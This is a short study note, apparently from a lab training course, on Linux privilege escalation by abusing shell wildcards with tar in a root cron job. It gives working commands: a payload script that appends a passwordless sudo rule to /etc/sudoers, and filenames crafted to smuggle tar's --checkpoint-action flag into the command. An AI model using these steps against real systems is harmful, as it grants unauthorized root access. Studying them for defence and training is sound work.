
2026-05-12 13:28

Tags: 

## Wildcard Abuse

- **Wildcards** are characters used to replace other characters and are interpreted by the shell _before_ commands are executed.


- **Common wildcards include:**
    - `*` : Matches any number of characters in a file name.
        
    - `?` : Matches a single character.
        
    - `[ ]` : Matches any single character at a defined position.
        
    - `~` : Expands to the user's home directory.
        
    - `-` : Denotes a range of characters (used within brackets).


## The Vulnerability: The `tar` Command

- `tar` is frequently used in *automated backup scripts (cron jobs).*


- It includes features that **allow arbitrary command execution** during the archiving process:
    - `--checkpoint[=N]`: Displays progress messages at specified intervals.
      
    - `--checkpoint-action=ACTION`: Executes a specific action (like running a system command) when a checkpoint is reached.


- **The Flaw:** If a script runs `tar` with a wildcard (e.g., `tar -zcf backup.tar.gz *`) in a directory where a lower-privileged user has write access, the shell will expand the `*` to include all filenames in that directory and pass them as arguments to `tar`.

## Exploitation Steps (Privilege Escalation)

- **Identify the target:** Locate a root-level cron job running a command like `tar -zcf archive.tar.gz *` inside a directory you control.
	- ![[Pasted image 20260512134358.png]]

- **Check what you are allowed to run**
	- `compgen -c`
	- `echo *`


- **Create the payload:** Write a script containing your malicious command.
    - _Example:_ `echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh`
    - ![[Pasted image 20260512134418.png]]


- **Create the wildcard triggers:** Create empty files named exactly like the vulnerable `tar` flags so they get passed as arguments during shell expansion.
    - _Example 1:_ `echo "" > "--checkpoint-action=exec=sh root.sh"`
        
    - _Example 2:_ `echo "" > --checkpoint=1`
    - ![[Pasted image 20260512134455.png]]


- **Execute and Escalate:** Once the scheduled cron job runs, `tar` reads your crafted filenames as legitimate command-line flags. It executes `root.sh` with root privileges, granting you passwordless `sudo` access.
	- ![[Pasted image 20260512134445.png]]

## References:

